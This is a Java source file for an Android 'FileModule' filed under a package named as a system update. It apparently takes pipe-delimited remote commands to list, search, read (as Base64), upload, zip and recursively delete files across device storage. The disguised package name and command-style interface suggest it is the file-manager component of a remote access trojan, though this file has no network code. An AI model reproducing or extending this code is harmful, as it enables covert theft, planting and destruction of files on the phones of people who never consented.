package com.android.system.update.modules;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.webkit.MimeTypeMap;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import org.json.JSONArray;
import org.json.JSONObject;
import org.json.JSONException;

public class FileModule {
    private static final String TAG = "FileModule";
    private Context context;
    private static final int MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB limit for transfers
    
    public FileModule(Context context) {
        this.context = context;
        Log.d(TAG, "FileModule initialized");
    }
    
    public String listFiles(String path) {
        Log.d(TAG, "========== listFiles called ==========");
        Log.d(TAG, "Requested path: " + path);
        
        try {
            File dir;
            if (path == null || path.isEmpty() || path.equals("/")) {
                dir = Environment.getExternalStorageDirectory();
                Log.d(TAG, "Using default external storage: " + dir.getAbsolutePath());
            } else {
                dir = new File(path);
                Log.d(TAG, "Using provided path: " + dir.getAbsolutePath());
            }
            
            Log.d(TAG, "Directory exists: " + dir.exists());
            Log.d(TAG, "Directory can read: " + dir.canRead());
            Log.d(TAG, "Directory is directory: " + dir.isDirectory());
            Log.d(TAG, "Directory absolute path: " + dir.getAbsolutePath());
            
            if (!dir.exists()) {
                Log.e(TAG, "ERROR: Directory does not exist: " + path);
                return createErrorResponse("Directory does not exist");
            }
            
            JSONObject result = new JSONObject();
            result.put("current_path", dir.getAbsolutePath());
            result.put("parent_path", dir.getParent() != null ? dir.getParent() : "");
            result.put("success", true);
            
            JSONArray filesList = new JSONArray();
            
            // Try multiple methods to get files
            boolean filesFound = false;
            
            // METHOD 1: Try using listFiles() first (works on older Android)
            if (!filesFound) {
                File[] files = dir.listFiles();
                Log.d(TAG, "Method 1 - listFiles() returned: " + (files == null ? "null" : files.length + " files"));
                
                if (files != null && files.length > 0) {
                    filesFound = true;
                    for (File file : files) {
                        addFileToJSON(file, filesList);
                    }
                }
            }
            
            // METHOD 2: Try using list() and create File objects
            if (!filesFound) {
                String[] fileNames = dir.list();
                Log.d(TAG, "Method 2 - list() returned: " + (fileNames == null ? "null" : fileNames.length + " files"));
                
                if (fileNames != null && fileNames.length > 0) {
                    filesFound = true;
                    for (String name : fileNames) {
                        File file = new File(dir, name);
                        addFileToJSON(file, filesList);
                    }
                }
            }
            
            // METHOD 3: For Android 10+, try using MediaStore API
            if (!filesFound && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                Log.d(TAG, "Method 3 - Trying MediaStore API...");
                filesFound = queryMediaStore(dir.getAbsolutePath(), filesList);
            }
            
            // METHOD 4: Check for specific known folders
            if (!filesFound) {
                Log.d(TAG, "Method 4 - Checking known folders...");
                String lowerPath = dir.getAbsolutePath().toLowerCase();
                
                if (lowerPath.contains("/download")) {
                    filesFound = queryMediaStoreByType(MediaStore.Files.getContentUri("external"), 
                        MediaStore.Files.FileColumns.DATA + " LIKE ?", 
                        new String[]{dir.getAbsolutePath() + "%"}, 
                        filesList, dir.getAbsolutePath());
                } else if (lowerPath.contains("/dcim") || lowerPath.contains("/camera")) {
                    filesFound = queryMediaStoreByType(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        MediaStore.Images.Media.DATA + " LIKE ?",
                        new String[]{dir.getAbsolutePath() + "%"},
                        filesList, dir.getAbsolutePath());
                } else if (lowerPath.contains("/music") || lowerPath.contains("/audio") || lowerPath.contains("/ringtones")) {
                    filesFound = queryMediaStoreByType(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                        MediaStore.Audio.Media.DATA + " LIKE ?",
                        new String[]{dir.getAbsolutePath() + "%"},
                        filesList, dir.getAbsolutePath());
                } else if (lowerPath.contains("/movies") || lowerPath.contains("/video")) {
                    filesFound = queryMediaStoreByType(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                        MediaStore.Video.Media.DATA + " LIKE ?",
                        new String[]{dir.getAbsolutePath() + "%"},
                        filesList, dir.getAbsolutePath());
                }
            }
            
            // If still no files, check permission status
            if (filesList.length() == 0) {
                Log.w(TAG, "No files found. Checking permission status...");
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (!Environment.isExternalStorageManager()) {
                        Log.e(TAG, "MANAGE_EXTERNAL_STORAGE permission not granted");
                        result.put("warning", "MANAGE_EXTERNAL_STORAGE permission required for this folder");
                    } else {
                        Log.e(TAG, "MANAGE_EXTERNAL_STORAGE granted but still no files");
                        result.put("warning", "Folder appears to be empty or inaccessible");
                    }
                } else {
                    // Check if we have read permission
                    if (!dir.canRead()) {
                        Log.e(TAG, "Directory cannot be read");
                        result.put("warning", "Cannot read directory - permission denied");
                    }
                }
            }
            
            result.put("files", filesList);
            result.put("total", filesList.length());
            
            Log.d(TAG, "Returning " + filesList.length() + " files");
            return result.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in listFiles", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in listFiles", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in listFiles", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    private void addFileToJSON(File file, JSONArray filesList) throws JSONException {
        JSONObject fileObj = new JSONObject();
        fileObj.put("name", file.getName());
        fileObj.put("path", file.getAbsolutePath());
        fileObj.put("isDirectory", file.isDirectory());
        fileObj.put("size", file.length());
        fileObj.put("lastModified", file.lastModified());
        fileObj.put("canRead", file.canRead());
        fileObj.put("canWrite", file.canWrite());
        fileObj.put("isHidden", file.isHidden());
        
        if (!file.isDirectory()) {
            String extension = getFileExtension(file.getName());
            String mimeType = getMimeType(file.getName());
            fileObj.put("extension", extension);
            fileObj.put("mimeType", mimeType);
        }
        
        filesList.put(fileObj);
    }
    
    private boolean queryMediaStore(String folderPath, JSONArray filesList) {
        boolean found = false;
        try {
            // Try general files query
            ContentResolver resolver = context.getContentResolver();
            Uri uri = MediaStore.Files.getContentUri("external");
            
            String[] projection = {
                MediaStore.Files.FileColumns._ID,
                MediaStore.Files.FileColumns.DISPLAY_NAME,
                MediaStore.Files.FileColumns.DATA,
                MediaStore.Files.FileColumns.SIZE,
                MediaStore.Files.FileColumns.DATE_MODIFIED,
                MediaStore.Files.FileColumns.MIME_TYPE
            };
            
            String selection = MediaStore.Files.FileColumns.DATA + " LIKE ? AND " +
                              MediaStore.Files.FileColumns.DATA + " NOT LIKE ?";
            String[] selectionArgs = new String[]{
                folderPath + "/%",
                folderPath + "/%/%"  // Exclude files in subdirectories
            };
            
            Cursor cursor = resolver.query(uri, projection, selection, selectionArgs, null);
            
            if (cursor != null) {
                int count = cursor.getCount();
                Log.d(TAG, "MediaStore query found " + count + " files");
                
                int nameCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DISPLAY_NAME);
                int dataCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA);
                int sizeCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.SIZE);
                int dateCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATE_MODIFIED);
                int mimeCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.MIME_TYPE);
                
                while (cursor.moveToNext()) {
                    JSONObject fileObj = new JSONObject();
                    String fileName = cursor.getString(nameCol);
                    String filePath = cursor.getString(dataCol);
                    long fileSize = cursor.getLong(sizeCol);
                    long dateModified = cursor.getLong(dateCol) * 1000;
                    String mimeType = cursor.getString(mimeCol);
                    
                    fileObj.put("name", fileName);
                    fileObj.put("path", filePath);
                    fileObj.put("isDirectory", false);
                    fileObj.put("size", fileSize);
                    fileObj.put("lastModified", dateModified);
                    fileObj.put("canRead", true);
                    fileObj.put("canWrite", false);
                    fileObj.put("isHidden", false);
                    
                    String ext = getFileExtension(fileName);
                    fileObj.put("extension", ext);
                    fileObj.put("mimeType", mimeType != null ? mimeType : "application/octet-stream");
                    
                    filesList.put(fileObj);
                    found = true;
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "MediaStore query failed", e);
        }
        return found;
    }
    
    private boolean queryMediaStoreByType(Uri uri, String selection, String[] selectionArgs, 
                                          JSONArray filesList, String folderPath) {
        boolean found = false;
        try {
            ContentResolver resolver = context.getContentResolver();
            
            String[] projection = {
                MediaStore.Files.FileColumns._ID,
                MediaStore.Files.FileColumns.DISPLAY_NAME,
                MediaStore.Files.FileColumns.DATA,
                MediaStore.Files.FileColumns.SIZE,
                MediaStore.Files.FileColumns.DATE_MODIFIED,
                MediaStore.Files.FileColumns.MIME_TYPE
            };
            
            Cursor cursor = resolver.query(uri, projection, selection, selectionArgs, null);
            
            if (cursor != null) {
                int nameCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DISPLAY_NAME);
                int dataCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA);
                int sizeCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.SIZE);
                int dateCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.DATE_MODIFIED);
                int mimeCol = cursor.getColumnIndex(MediaStore.Files.FileColumns.MIME_TYPE);
                
                while (cursor.moveToNext()) {
                    String filePath = cursor.getString(dataCol);
                    // Only include files directly in this folder
                    if (new File(filePath).getParent().equals(folderPath)) {
                        JSONObject fileObj = new JSONObject();
                        fileObj.put("name", cursor.getString(nameCol));
                        fileObj.put("path", filePath);
                        fileObj.put("isDirectory", false);
                        fileObj.put("size", cursor.getLong(sizeCol));
                        fileObj.put("lastModified", cursor.getLong(dateCol) * 1000);
                        fileObj.put("canRead", true);
                        fileObj.put("canWrite", false);
                        fileObj.put("isHidden", false);
                        
                        String fileName = cursor.getString(nameCol);
                        String ext = getFileExtension(fileName);
                        fileObj.put("extension", ext);
                        fileObj.put("mimeType", cursor.getString(mimeCol));
                        
                        filesList.put(fileObj);
                        found = true;
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "MediaStore query by type failed", e);
        }
        return found;
    }
    
    public String testFolder(String path) {
        try {
            if (path == null || path.isEmpty()) {
                return "❌ Error: No path provided. Usage: test_folder|/path/to/folder";
            }
            
            File dir = new File(path);
            StringBuilder result = new StringBuilder();
            result.append("📁 Testing folder: ").append(path).append("\n");
            result.append("Exists: ").append(dir.exists()).append("\n");
            result.append("Can read: ").append(dir.canRead()).append("\n");
            result.append("Can write: ").append(dir.canWrite()).append("\n");
            result.append("Is directory: ").append(dir.isDirectory()).append("\n");
            result.append("Is file: ").append(dir.isFile()).append("\n");
            result.append("Absolute path: ").append(dir.getAbsolutePath()).append("\n");
            
            if (dir.exists()) {
                result.append("Length: ").append(dir.length()).append(" bytes\n");
                result.append("Last modified: ").append(new java.util.Date(dir.lastModified())).append("\n");
            }
            
            // Android version and permissions
            result.append("Android API: ").append(Build.VERSION.SDK_INT).append("\n");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                result.append("MANAGE_EXTERNAL_STORAGE: ").append(
                    Environment.isExternalStorageManager() ? "GRANTED" : "NOT GRANTED"
                ).append("\n");
            }
            
            if (dir.exists() && dir.isDirectory()) {
                // Try different listing methods
                String[] list1 = dir.list();
                result.append("\n📊 Directory listing results:\n");
                result.append("Method 1 (list()): ").append(list1 == null ? "null" : list1.length + " files").append("\n");
                
                File[] list2 = dir.listFiles();
                result.append("Method 2 (listFiles()): ").append(list2 == null ? "null" : list2.length + " files").append("\n");
                
                if (list2 != null && list2.length > 0) {
                    result.append("\n📄 First 10 items:\n");
                    for (int i = 0; i < Math.min(list2.length, 10); i++) {
                        File f = list2[i];
                        result.append("  ").append(i+1).append(". ")
                              .append(f.getName())
                              .append(f.isDirectory() ? " (folder)" : " (file)")
                              .append(" - ").append(formatSize(f.length()))
                              .append("\n");
                    }
                } else {
                    result.append("\n⚠️ No files found via standard methods. Trying MediaStore...\n");
                    
                    // Try MediaStore query
                    JSONArray tempList = new JSONArray();
                    if (queryMediaStore(dir.getAbsolutePath(), tempList)) {
                        result.append("✅ MediaStore found ").append(tempList.length()).append(" files\n");
                        for (int i = 0; i < Math.min(tempList.length(), 5); i++) {
                            JSONObject obj = tempList.getJSONObject(i);
                            result.append("  - ").append(obj.getString("name")).append("\n");
                        }
                    } else {
                        result.append("❌ MediaStore also found no files\n");
                    }
                }
            }
            
            Log.d(TAG, result.toString());
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error testing folder", e);
            return "❌ Error: " + e.getMessage() + "\n" + 
                   android.util.Log.getStackTraceString(e);
        }
    }
    
    private String formatSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        int exp = (int) (Math.log(bytes) / Math.log(1024));
        String pre = "KMGTPE".charAt(exp-1) + "";
        return String.format("%.1f %sB", bytes / Math.pow(1024, exp), pre);
    }
    
   public String getFile(String path) {
    Log.d(TAG, "getFile called for path: " + path);
    
    try {
        File file = new File(path);
        Log.d(TAG, "File exists: " + file.exists());
        Log.d(TAG, "File can read: " + file.canRead());
        Log.d(TAG, "File size: " + file.length());
        
        if (!file.exists()) {
            Log.e(TAG, "File not found: " + path);
            return createErrorResponse("File not found");
        }
        
        if (!file.canRead()) {
            Log.e(TAG, "Cannot read file - permission denied: " + path);
            return createErrorResponse("Cannot read file - permission denied");
        }
        
        if (file.length() > MAX_FILE_SIZE) {
            Log.e(TAG, "File too large: " + file.length() + " bytes");
            return createErrorResponse("File too large (max " + (MAX_FILE_SIZE/1024/1024) + "MB)");
        }
        
        FileInputStream fis = new FileInputStream(file);
        byte[] bytes = new byte[(int) file.length()];
        int read = fis.read(bytes);
        fis.close();
        
        Log.d(TAG, "File read successfully, bytes read: " + read);
        
        // Encode to Base64 WITHOUT line breaks
        String base64Data = Base64.encodeToString(bytes, Base64.NO_WRAP | Base64.NO_PADDING);
        
        JSONObject response = new JSONObject();
        response.put("success", true);
        response.put("name", file.getName());
        response.put("path", file.getAbsolutePath());
        response.put("size", file.length());
        response.put("data", base64Data);
        response.put("mimeType", getMimeType(file.getName()));
        
        String jsonString = response.toString();
        Log.d(TAG, "JSON response length: " + jsonString.length());
        
        return jsonString;
        
    } catch (JSONException e) {
        Log.e(TAG, "JSON error in getFile", e);
        return createErrorResponse("JSON error: " + e.getMessage());
    } catch (SecurityException e) {
        Log.e(TAG, "Security exception in getFile", e);
        return createErrorResponse("Permission denied: " + e.getMessage());
    } catch (Exception e) {
        Log.e(TAG, "Exception in getFile", e);
        return createErrorResponse(e.getMessage());
    }
}
    
    public String deleteFile(String path) {
        Log.d(TAG, "deleteFile called for path: " + path);
        
        try {
            File file = new File(path);
            Log.d(TAG, "File exists: " + file.exists());
            Log.d(TAG, "Is directory: " + file.isDirectory());
            
            if (!file.exists()) {
                Log.e(TAG, "File not found: " + path);
                return createErrorResponse("File not found");
            }
            
            boolean deleted;
            if (file.isDirectory()) {
                Log.d(TAG, "Deleting directory recursively");
                deleted = deleteDirectory(file);
            } else {
                Log.d(TAG, "Deleting single file");
                deleted = file.delete();
            }
            
            Log.d(TAG, "Delete result: " + deleted);
            
            if (deleted) {
                JSONObject response = new JSONObject();
                response.put("success", true);
                response.put("message", "Deleted successfully");
                response.put("path", path);
                return response.toString();
            } else {
                Log.e(TAG, "Failed to delete: " + path);
                return createErrorResponse("Failed to delete");
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in deleteFile", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in deleteFile", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in deleteFile", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    private boolean deleteDirectory(File directory) {
        Log.d(TAG, "deleteDirectory called for: " + directory.getAbsolutePath());
        
        if (directory.exists()) {
            File[] files = directory.listFiles();
            if (files != null) {
                Log.d(TAG, "Found " + files.length + " items to delete");
                for (File file : files) {
                    if (file.isDirectory()) {
                        deleteDirectory(file);
                    } else {
                        boolean deleted = file.delete();
                        Log.d(TAG, "Deleted file: " + file.getName() + " - " + deleted);
                    }
                }
            }
        }
        boolean result = directory.delete();
        Log.d(TAG, "Directory deleted: " + result);
        return result;
    }
    
    public String createFolder(String path, String folderName) {
        Log.d(TAG, "createFolder called - path: " + path + ", folderName: " + folderName);
        
        try {
            File folder = new File(path, folderName);
            Log.d(TAG, "Full folder path: " + folder.getAbsolutePath());
            Log.d(TAG, "Folder already exists: " + folder.exists());
            
            if (folder.exists()) {
                Log.e(TAG, "Folder already exists");
                return createErrorResponse("Folder already exists");
            }
            
            boolean created = folder.mkdirs();
            Log.d(TAG, "Folder created: " + created);
            
            if (created) {
                JSONObject response = new JSONObject();
                response.put("success", true);
                response.put("message", "Folder created");
                response.put("path", folder.getAbsolutePath());
                return response.toString();
            } else {
                Log.e(TAG, "Failed to create folder");
                return createErrorResponse("Failed to create folder");
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in createFolder", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in createFolder", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in createFolder", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    public String renameFile(String oldPath, String newName) {
        Log.d(TAG, "renameFile called - oldPath: " + oldPath + ", newName: " + newName);
        
        try {
            File oldFile = new File(oldPath);
            File parent = oldFile.getParentFile();
            File newFile = new File(parent, newName);
            
            Log.d(TAG, "Old file exists: " + oldFile.exists());
            Log.d(TAG, "New file path: " + newFile.getAbsolutePath());
            Log.d(TAG, "New file already exists: " + newFile.exists());
            
            if (newFile.exists()) {
                Log.e(TAG, "A file with that name already exists");
                return createErrorResponse("A file with that name already exists");
            }
            
            boolean renamed = oldFile.renameTo(newFile);
            Log.d(TAG, "Rename result: " + renamed);
            
            if (renamed) {
                JSONObject response = new JSONObject();
                response.put("success", true);
                response.put("message", "Renamed successfully");
                response.put("newPath", newFile.getAbsolutePath());
                return response.toString();
            } else {
                Log.e(TAG, "Failed to rename");
                return createErrorResponse("Failed to rename");
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in renameFile", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in renameFile", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in renameFile", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    public String uploadFile(String path, String fileName, String base64Data) {
        Log.d(TAG, "uploadFile called - path: " + path + ", fileName: " + fileName);
        
        try {
            File dir = new File(path);
            if (!dir.exists()) {
                Log.d(TAG, "Creating directory: " + path);
                dir.mkdirs();
            }
            
            File file = new File(dir, fileName);
            Log.d(TAG, "Full file path: " + file.getAbsolutePath());
            
            byte[] bytes = Base64.decode(base64Data, Base64.DEFAULT);
            Log.d(TAG, "Decoded Base64 data, size: " + bytes.length + " bytes");
            
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(bytes);
            fos.close();
            
            Log.d(TAG, "File written successfully");
            
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("message", "File uploaded");
            response.put("path", file.getAbsolutePath());
            response.put("size", bytes.length);
            
            return response.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in uploadFile", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in uploadFile", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in uploadFile", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    public String zipFile(String path) {
        Log.d(TAG, "zipFile called for path: " + path);
        
        try {
            File source = new File(path);
            File zipFile = new File(source.getParent(), source.getName() + ".zip");
            
            Log.d(TAG, "Source exists: " + source.exists());
            Log.d(TAG, "Source is directory: " + source.isDirectory());
            Log.d(TAG, "Zip file path: " + zipFile.getAbsolutePath());
            
            if (zipFile.exists()) {
                Log.d(TAG, "Removing existing zip file");
                zipFile.delete();
            }
            
            FileOutputStream fos = new FileOutputStream(zipFile);
            ZipOutputStream zos = new ZipOutputStream(fos);
            
            if (source.isDirectory()) {
                Log.d(TAG, "Zipping directory: " + source.getName());
                zipDirectory(source, source.getName(), zos);
            } else {
                Log.d(TAG, "Zipping file: " + source.getName());
                zipFile(source, source.getName(), zos);
            }
            
            zos.close();
            fos.close();
            
            Log.d(TAG, "Zip completed, size: " + zipFile.length());
            
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("message", "Zipped successfully");
            response.put("path", zipFile.getAbsolutePath());
            response.put("size", zipFile.length());
            
            return response.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in zipFile", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in zipFile", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in zipFile", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    private void zipDirectory(File folder, String parentFolder, ZipOutputStream zos) throws Exception {
        Log.d(TAG, "Zipping directory: " + folder.getAbsolutePath());
        
        File[] files = folder.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    zipDirectory(file, parentFolder + "/" + file.getName(), zos);
                } else {
                    zipFile(file, parentFolder + "/" + file.getName(), zos);
                }
            }
        }
    }
    
    private void zipFile(File file, String entryName, ZipOutputStream zos) throws Exception {
        Log.d(TAG, "Zipping file: " + file.getName() + " as " + entryName);
        
        byte[] buffer = new byte[1024];
        FileInputStream fis = new FileInputStream(file);
        zos.putNextEntry(new ZipEntry(entryName));
        
        int length;
        while ((length = fis.read(buffer)) > 0) {
            zos.write(buffer, 0, length);
        }
        
        zos.closeEntry();
        fis.close();
    }
    
    public String searchFiles(String path, String query) {
        Log.d(TAG, "searchFiles called - path: " + path + ", query: " + query);
        
        try {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) {
                Log.e(TAG, "Invalid directory: " + path);
                return createErrorResponse("Invalid directory");
            }
            
            JSONArray results = new JSONArray();
            searchInDirectory(dir, query.toLowerCase(), results);
            
            Log.d(TAG, "Search found " + results.length() + " results");
            
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("results", results);
            response.put("count", results.length());
            
            return response.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in searchFiles", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception in searchFiles", e);
            return createErrorResponse("Permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in searchFiles", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    private void searchInDirectory(File dir, String query, JSONArray results) throws Exception {
        File[] files = dir.listFiles();
        if (files == null) return;
        
        for (File file : files) {
            if (file.getName().toLowerCase().contains(query)) {
                JSONObject fileObj = new JSONObject();
                fileObj.put("name", file.getName());
                fileObj.put("path", file.getAbsolutePath());
                fileObj.put("isDirectory", file.isDirectory());
                fileObj.put("size", file.length());
                fileObj.put("lastModified", file.lastModified());
                results.put(fileObj);
                
                Log.d(TAG, "Search match: " + file.getAbsolutePath());
            }
            
            if (file.isDirectory()) {
                searchInDirectory(file, query, results);
            }
        }
    }
    
    public String getStorageInfo() {
        Log.d(TAG, "getStorageInfo called");
        
        try {
            JSONObject info = new JSONObject();
            
            // Internal storage
            File internal = Environment.getExternalStorageDirectory();
            if (internal != null) {
                JSONObject internalInfo = new JSONObject();
                internalInfo.put("path", internal.getAbsolutePath());
                internalInfo.put("total", internal.getTotalSpace());
                internalInfo.put("free", internal.getFreeSpace());
                internalInfo.put("used", internal.getTotalSpace() - internal.getFreeSpace());
                info.put("internal", internalInfo);
                
                Log.d(TAG, "Internal storage - Path: " + internal.getAbsolutePath());
                Log.d(TAG, "Internal storage - Total: " + internal.getTotalSpace());
                Log.d(TAG, "Internal storage - Free: " + internal.getFreeSpace());
            }
            
            // Check for external SD card
            File[] externalFiles = context.getExternalFilesDirs(null);
            if (externalFiles.length > 1 && externalFiles[1] != null) {
                JSONObject externalInfo = new JSONObject();
                externalInfo.put("path", externalFiles[1].getAbsolutePath());
                externalInfo.put("available", true);
                info.put("external", externalInfo);
                
                Log.d(TAG, "External storage found: " + externalFiles[1].getAbsolutePath());
            }
            
            info.put("success", true);
            return info.toString();
            
        } catch (JSONException e) {
            Log.e(TAG, "JSON error in getStorageInfo", e);
            return createErrorResponse("JSON error: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Exception in getStorageInfo", e);
            return createErrorResponse(e.getMessage());
        }
    }
    
    private String getFileExtension(String fileName) {
        int lastDot = fileName.lastIndexOf('.');
        if (lastDot > 0 && lastDot < fileName.length() - 1) {
            return fileName.substring(lastDot + 1).toLowerCase();
        }
        return "";
    }
    
    private String getMimeType(String fileName) {
        String extension = getFileExtension(fileName);
        if (extension.isEmpty()) return "application/octet-stream";
        
        MimeTypeMap mime = MimeTypeMap.getSingleton();
        String type = mime.getMimeTypeFromExtension(extension);
        return type != null ? type : "application/octet-stream";
    }
    
    private String createErrorResponse(String message) {
        try {
            JSONObject error = new JSONObject();
            error.put("success", false);
            error.put("error", message);
            return error.toString();
        } catch (JSONException e) {
            return "{\"success\":false,\"error\":\"" + message + "\"}";
        }
    }
}
